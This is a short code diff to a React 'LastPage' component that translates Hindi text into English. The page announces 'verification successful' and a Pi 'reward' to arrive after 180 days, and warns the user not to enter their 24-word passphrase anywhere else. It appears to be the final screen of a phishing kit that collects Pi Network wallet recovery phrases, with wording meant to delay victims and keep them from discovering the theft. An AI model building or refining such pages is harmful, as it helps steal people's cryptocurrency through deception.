@@ -19,9 +19,9 @@ const LastPage = () => {
               </nav>
 
               <div className='p-2'>
-                  <h1 className="text-lg font-semibold mt-5">वेरीफिकेशन सक्सेसफुल.</h1>
-                  <h1 className="text-lg font-semibold mt-5">Pi विल बी आटोमेटिकली ट्रांसफरड आफ्टर १८० <br />डेज।.</h1>
-                  <h1 className="text-lg font-semibold mt-5">सुनिश्चित करें कि आप अपनी 24 शब्दों की <br />पासवर्ड कहीं और न डालें ताकि प्राप्त होने के <br /> बाद आपका इनाम न खो जाए।</h1>
+                  <h1 className="text-lg font-semibold mt-5">Verification successful.</h1>
+                  <h1 className="text-lg font-semibold mt-5">Pi will be automatically transferred after 180<br />days.</h1>
+                  <h1 className="text-lg font-semibold mt-5">Make sure you do not enter your 24 word password anywhere else so that your reward is not lost after receiving it.</h1>
       <p  className='text-start  text-[12px] mt-8  ' >As a non-custodial wallet, your passphrase is only accessible to you. <br /> Password recovery is currently not possible</p>
       <p  className=' text-start  text-[12px] mt-5' >Lost your password example? <span className=' text-blue-400'>You can create a new wallet,</span> but all the π in your previous wallet will be inaccessible.</p>
 
